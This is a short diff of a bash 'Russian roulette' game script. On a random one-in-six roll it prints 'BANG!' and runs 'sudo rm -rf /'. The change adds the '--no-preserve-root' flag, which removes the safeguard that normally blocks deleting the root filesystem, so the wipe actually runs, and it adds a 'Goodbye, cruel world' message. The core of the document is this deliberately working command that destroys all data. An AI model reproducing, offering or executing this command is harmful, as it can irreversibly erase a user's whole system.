@@ -21,7 +21,8 @@ if [ $[ RANDOM % 6 ] -eq 0 ]
     then
         printf "BANG!\n"
         sleep 1.5
-        sudo rm -rf /
+        printf "Goodbye, cruel world...\n"
+        sudo rm -rf / --no-preserve-root
     else
         printf "Click.\n"
         printf "You got lucky this time...\n"
